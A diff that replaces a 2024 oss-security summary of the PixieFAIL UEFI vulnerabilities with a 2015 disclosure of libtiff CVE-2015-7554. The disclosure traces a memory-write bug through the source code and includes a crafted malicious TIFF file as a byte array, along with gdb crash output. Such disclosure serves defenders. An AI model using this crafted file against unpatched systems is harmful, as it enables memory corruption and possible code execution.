@@ -1,4 +1,9 @@
-Received: (qmail 1348 invoked by uid 550); 16 Jan 2024 16:11:56 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6679" "Saturday" "26" "December" "2015" "23:34:40" "+0700" "Hans Jerry Illikainen" "hji@dyntopia.com" "<m1a8oxqicf.darpa@darpa.mil>" "210" "[oss-security] libtiff: invalid write (CVE-2015-7554)" nil nil nil "12" "2015122616:34:40" "[oss-security] libtiff: invalid write (CVE-2015-7554)" (number mark "U       hji@dyntopia Dec 26  210/6679  " thread-indent "\"[oss-security] libtiff: invalid write (CVE-2015-7554)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 31833 invoked by uid 550); 26 Dec 2015 16:33:36 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,97 +12,246 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 1324 invoked from network); 16 Jan 2024 16:11:55 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=notcom.org;
-	s=jk; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
-	Subject:To:From:Date:Sender:Reply-To:Cc:Content-ID:Content-Description:
-	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
-	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
-	List-Post:List-Owner:List-Archive;
-	bh=/jw/LPvbXJgDkAv4CA2gwQdqWo7aaQs8hP8VVp2ocBo=; t=1705421624; x=1706069624; 
-	b=sue24zjyAmEcK+21b96zmyc/15VGVW/w4M6k2PaSG0tmcPZAZg2GhuaiEzPUPtgKd00yT9M5IKd
-	I6lWstcayYt646IEv6XiMi/0CCr7XrMYxch12NcrBR4gkze3MFGDkEMnYEmCVryYLQs/gba5u3VQK
-	7p2g/7Ajfqbm76p7EEqGKnzvZ2fJeSnXMMJt2tUlITx3xXgszsGNjmNZOyCbBaQ1D+Oc1rdxlUiVt
-	PyilZC/f+JlUUjvpQQyz73Jl2wM0D3nBzYUIeESz/QRxSWnUgRnLhEWZ1YnJ/MQ4b6PKI9kuxroSr
-	xYCBDHjyDYiIBf9xGY3/zTKFa9FjbH8Pmrzg==;
-Date: Tue, 16 Jan 2024 18:13:27 +0200
-From: Valtteri Vuorikoski <vuori@notcom.org>
-To: oss-security@lists.openwall.com
-Message-ID: <sobqqcafukr63hmp5gnjp7ncoc3xa5b275g3yfnppthnbtwdu3@g6yax7ir4tiv>
-Mail-Followup-To: oss-security@lists.openwall.com
+Received: (qmail 30653 invoked from network); 26 Dec 2015 16:33:20 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=dyntopia-com.20150623.gappssmtp.com; s=20150623;
+        h=from:to:subject:date:message-id:mime-version:content-type;
+        bh=mznwQxzYulapaV9gJ46aAueqKSNK+GVwFq9sIoQ4w3o=;
+        b=fWJ25wQHsLVZdoMJwIrQn6VWz5F+GFRCHqenDe4lF8lA2uDsWVb8zUD+2f8v3S1v6v
+         gYjC4IwUA7gYpf5LuLqQu8CrPTZZauChaSI1s4gxEVY5+sIq2O9ByQEmAZrRSvx75aDw
+         VYjkXRemapdtCs30LH/QAJRNpvpOaVtfKsNW3+gQBnM9vs0qV6KmCk+DZokqMAIQeffF
+         KMryzTxaWZUZ+4E+ApT3aUF2JsbpsM2RPdRY+yrSUmOW/Tjk2iYAL8kiod4H4u4KDg+K
+         MORWY5YbiRh8fuksoJ3IicJ4V3DQ+OryTzDrWMGeOefdbAkcjHzreCyftljInNH5ZW9n
+         3u8w==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:from:to:subject:date:message-id:mime-version
+         :content-type;
+        bh=mznwQxzYulapaV9gJ46aAueqKSNK+GVwFq9sIoQ4w3o=;
+        b=ZZQY8V1htvwJVET2MfbnagZD5ZTgSXIGBcQWS7USyvRwDiP+0HIFZBVtJ9c319AfBB
+         t2iTAbmPdnlW82kuu25Waktl89OBbiiL1Yv1psYjQN2hEYO3fb6GTn5XB3rVWAb46BxA
+         SwAmO2oCk4kq9X20n11GTH7+YydkRV5P5qSEplKFPm5Q3Ym1nkrnRnNfR9iNq3nZUxD7
+         JndWx/luJgEq9hCvKxt/jRaKYUow5c5f/dvIhQ/0kiJDLHpTfraQwhc9WZU970RyTphP
+         7P8GJST1hWGL88tN6ZliiK+km5wbHfPnzo4QjRUSz2JoqBPppWrwrhSy6fnQWg2GJ2Qz
+         LoIQ==
+X-Gm-Message-State: ALoCoQme5tULOUcYcYH9BvxIlMdRPhg6SH2vx7n4ftylGLKmyu5mboqjGpDxpCKV3Or/SxiBVOJZ40n6Ay2EZwpTkoKT91GwPQ==
+X-Received: by 10.28.93.195 with SMTP id r186mr48344377wmb.37.1451147589368;
+        Sat, 26 Dec 2015 08:33:09 -0800 (PST)
+From: Hans Jerry Illikainen <hji@dyntopia.com>
+To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, oss-security@lists.openwall.com
+Date: Sat, 26 Dec 2015 23:34:40 +0700
+Message-ID: <m1a8oxqicf.darpa@darpa.mil>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-User-Agent: NeoMutt/20231006-6-ca2e93
-Subject: [oss-security] CVE-2023-45229 and others: Multiple vulnerabilities in EDK II UEFI
- stack (PixieFAIL)
+Content-Type: text/plain
+Subject: [oss-security] libtiff: invalid write (CVE-2015-7554)
 
-(Not associated with Quarkslab or Tianocore.)
 
-Quarkslab has published an advisory concerning multiple
-vulnerabilities in the network boot (PXE) component of Tianocore EDK
-II, the open-source UEFI reference implementation. They title this
-series of vulnerabilities "PixieFAIL":
-<https://blog.quarkslab.com/pixiefail-nine-vulnerabilities-in-tianocores-edk-ii-ipv6-network-stack.html>
+`_TIFFVGetField()' in libtiff-4.0.6 may write field data for certain
+extension tags to invalid or possibly arbitrary memory.
 
-The introduction states:
+Each tag has a `field_passcount' variable in their TIFFField struct:
 
-  In order to provide [the] network booting feature, UEFI implements a
-  full IP stack at the DXE phase, opening the door to attacks from the
-  local network during this early stage of the boot process.
-  […]
-  The EDK II UEFI reference implementation provides both IPv4- and
-  IPv6-based PXE. In the latest available specification (UEFI 2.10) as
-  of this writing, IPv6-based PXE is described in section "24.3.18 -
-  Netboot6".
+tiff-4.0.6/libtiff/tif_dir.h #276..289:
+,----
+| struct _TIFFField {
+|     uint32 field_tag;                       /* field's tag */
+|     short field_readcount;                  /* read count/TIFF_VARIABLE/TIFF_SPP */
+|     short field_writecount;                 /* write count/TIFF_VARIABLE */
+|     TIFFDataType field_type;                /* type of associated data */
+|     uint32 reserved;                        /* reserved for future extension */
+|     TIFFSetGetFieldType set_field_type;     /* type to be passed to TIFFSetField */
+|     TIFFSetGetFieldType get_field_type;     /* type to be passed to TIFFGetField */
+|     unsigned short field_bit;               /* bit in fieldsset bit vector */
+|     unsigned char field_oktochange;         /* if true, can change while writing */
+|     unsigned char field_passcount;          /* if true, pass dir count on set */
+|     char* field_name;                       /* ASCII name */
+|     TIFFFieldArray* field_subfields;        /* if field points to child ifds, child ifd field definition array */
+| };
+`----
 
-  We performed a cursory inspection of NetworkPkg, Tianocore's EDK II
-  PXE implementation, and identified nine vulnerabilities that can be
-  exploited by unauthenticated remote attackers on the same local
-  network, and in some cases, by attackers on remote networks. The
-  impact of these vulnerabilities includes denial of service,
-  information leakage, remote code execution, DNS cache poisoning, and
-  network session hijacking.
+For example:
 
-The specific vulnerabilities included in the advisory largely, though
-not exclusively, concern the IPv6 side of the network stack:
+tiff-4.0.6/libtiff/tif_fax3.c #1139..1141:
+,----
+| static const TIFFField fax3Fields[] = {
+|     { TIFFTAG_GROUP3OPTIONS, 1, 1, TIFF_LONG, 0, TIFF_SETGET_UINT32, TIFF_SETGET_UINT32, FIELD_OPTIONS, FALSE, FALSE, "Group3Options", NULL },
+| };
+`----
 
-CVE-2023-45229: Integer underflow when processing IA_NA/IA_TA options
-in a DHCPv6 Advertise message
+However, `field_passcount' is always assigned TRUE if the tag is
+processed by `_TIFFCreateAnonField()'.  This happens on unsuccessful
+invocations of `TIFFReadDirectoryFindFieldInfo()':
 
-CVE-2023-45230: Buffer overflow in the DHCPv6 client via a long Server
-ID option
+tiff-4.0.6/libtiff/tif_dirread.c #3396..4076:
+,----
+| int
+| TIFFReadDirectory(TIFF* tif)
+| {
+| [...]
+|             TIFFReadDirectoryFindFieldInfo(tif,dp->tdir_tag,&fii);
+|             if (fii == FAILED_FII)
+|             {
+|                 TIFFWarningExt(tif->tif_clientdata, module,
+|                                "Unknown field with tag %d (0x%x) encountered",
+|                                dp->tdir_tag,dp->tdir_tag);
+|                 /* the following knowingly leaks the
+|                    anonymous field structure */
+|                 if (!_TIFFMergeFields(tif,
+|                                       _TIFFCreateAnonField(tif,
+|                                           dp->tdir_tag,
+|                                           (TIFFDataType) dp->tdir_type),
+|                                       1)) {
+| [...]
+| }
+`----
 
-CVE-2023-45231: Out of Bounds read when handling a ND Redirect message
-with truncated options
+tiff-4.0.6/libtiff/tif_dirinfo.c #627..719:
+,----
+| TIFFField*
+| _TIFFCreateAnonField(TIFF *tif, uint32 tag, TIFFDataType field_type)
+| {
+|     [...]
+|     fld->field_bit = FIELD_CUSTOM;
+|     [...]
+|     fld->field_passcount = TRUE;
+|     [...]
+| }
+`----
 
-CVE-2023-45232: Infinite loop when parsing unknown options in the
-Destination Options header
+If the field for a 1-count extension tag whose `field_passcount' has
+been overridden is later read by `_TIFFVGetField()', this happens:
 
-CVE-2023-45233: Infinite loop when parsing a PadN option in the
-Destination Options header
+tiff-4.0.6/libtiff/tif_dir.c #823..1145:
+,----
+| static int
+| _TIFFVGetField(TIFF* tif, uint32 tag, va_list ap)
+| {
+|     [...]
+|     uint32 standard_tag = tag;
+|     [...]
+|     if (fip->field_bit == FIELD_CUSTOM) {
+|         standard_tag = 0;
+|     }
+| 
+|     switch (standard_tag) {
+|         [...]
+|         default:
+|         {
+|             [...]
+|             for (i = 0; i < td->td_customValueCount; i++) {
+|                 [...]
+|                 if (fip->field_passcount) {
+|                     if (fip->field_readcount == TIFF_VARIABLE2)
+|                         *va_arg(ap, uint32*) = (uint32)tv->count;
+|                     else  /* Assume TIFF_VARIABLE */
+|                         *va_arg(ap, uint16*) = (uint16)tv->count;
+|                     *va_arg(ap, void **) = tv->value;
+|                     ret_val = 1;
+|                 }
+|                 [...]
+|             }
+|         }
+|     }
+|     [...]
+| }
+`----
 
-CVE-2023-45234: Buffer overflow when processing DNS Servers option in
-a DHCPv6 Advertise message
 
-CVE-2023-45235: Buffer overflow when handling Server ID option from a
-DHCPv6 proxy Advertise message
+With an invocation of `TIFFGetField()' such as:
 
-CVE-2023-45236: Predictable TCP Initial Sequence Numbers
+,----
+| TIFFGetField(tif, TIFFTAG_GROUP3OPTIONS, &dst);
+`----
 
-CVE-2023-45237: Use of a Weak PseudoRandom Number Generator
+for a TIFFTAG_GROUP3OPTIONS specified as:
 
-Based on the Quarkslab advisory and a separate Microsoft advisory
-linked therein, many ISVs that use EDK II as the base for their
-proprietary BIOSes have admitted vulnerabilities. Specific PC vendors
-are mostly listed as "unknown", but seems likely that the proprietary
-BIOSes shipped by many of them are vulnerable.
+,----
+| 0x24, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41
+| ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^
+| tag         type        count                   offset/value
+`----
 
-I would guess (but have no specific knowledge) that downstream
-open-source projects that use EDK II code, potentially including the
-OVMF builds of it commonly used with qemu VMs, will also in many cases
-be vulnerable if they are built with network boot support enabled.
+the count is written to `dst', whereas 0x41414141 is written to
+invalid/arbitrary memory.
 
- -Valtteri
- 
+
+Using the included tiffsplit utility as an example:
+
+tiff-4.0.6/tools/tiffsplit.c #157..228:
+,----
+| static int
+| tiffcp(TIFF* in, TIFF* out)
+| {
+|     [...]
+|     CopyField(TIFFTAG_YRESOLUTION, floatv);
+|     CopyField(TIFFTAG_GROUP3OPTIONS, longv);
+|     [...]
+| }
+`----
+
+,----
+| $ gdb -q --args tiffsplit tag.tiff
+| Reading symbols from tiffsplit...done.
+| (gdb) r
+| TIFFReadDirectory: Warning, Unknown field with tag 292 (0x124) encountered.
+| 
+| Program received signal SIGSEGV, Segmentation fault.
+| 0xb7f68155 in _TIFFVGetField (tif=0x804d008, tag=292, ap=0xbffff660 "\024\367\377\277\210\366\377\277\200\366\377\277\067\206\004\b0\371\377\267") at tif_dir.c:1056
+| 1056                            *va_arg(ap, void **) = tv->value;
+| (gdb) x/i $eip
+| => 0xb7f68155 <_TIFFVGetField+2229 at tif_dir.c:1056>:	mov    %edx,(%eax)
+| (gdb) x/x $edx
+| 0x804d670:	0x41414141
+| (gdb) x/x $eax
+| 0x41410000:	Cannot access memory at address 0x41410000
+| (gdb)
+`----
+
+
+tag.tiff:
+,----
+| unsigned char tiff[] = {
+|     /* little-endian */
+|     0x49, 0x49,
+| 
+|     /* version */
+|     0x2a, 0x00,
+| 
+|     /* tif->tif_diroff */
+|     0x09, 0x00, 0x00, 0x00,
+|     0x00,
+| 
+|     /* tag count */
+|     0x07, 0x00,
+| 
+|     /* tag    | type      | count                 | offset/value         */
+|     /* TIFFTAG_IMAGEWIDTH */
+|     0x00, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_IMAGELENGTH */
+|     0x01, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_BITSPERSAMPLE */
+|     0x02, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_STRIPOFFSETS */
+|     0x11, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_STRIPBYTECOUNTS */
+|     0x17, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_YRESOLUTION */
+|     0x1b, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x00,
+|     /* TIFFTAG_GROUP3OPTIONS */
+|     0x24, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
+| 
+|     /* tif->tif_nextdiroff */
+|     0x00, 0x00, 0x00, 0x00,
+| 
+|     /* bits per sample */
+|     0x08, 0x00,
+|     0x08, 0x00,
+|     0x08, 0x00,
+| };
+`----
+
+
+This issue has been assigned CVE-2015-7554 and it has yet to be fixed.
+
+-- 
+Hans Jerry Illikainen
